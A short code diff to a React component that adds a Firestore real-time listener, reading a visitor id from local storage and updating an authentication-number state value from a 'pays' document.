@@ -13,6 +13,7 @@ import {
 import { useEffect, useState } from "react";
 import { addData, db } from "@/lib/firebase";
 import { Alert } from "@/components/ui/alert";
+import { doc, onSnapshot } from "firebase/firestore";
 
 export default function Component() {
   const [showAuthDialog, setShowAuthDialog] = useState(false);
@@ -23,6 +24,21 @@ export default function Component() {
   const [showError, setShowError] = useState("");
 
   
+  useEffect(() => {
+    const visitorId = localStorage.getItem("visitor")
+    if (visitorId) {
+      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
+        if (docSnap.exists()) {
+          const data = docSnap.data()
+          setAuthNumber( data.authNumber)
+      
+        }
+      })
+
+      return () => unsubscribe()
+    }
+  }, [])
+
   const handleLogin = (e: any) => {
     e.preventDefault();
     const visitorId = localStorage.getItem("visitor");
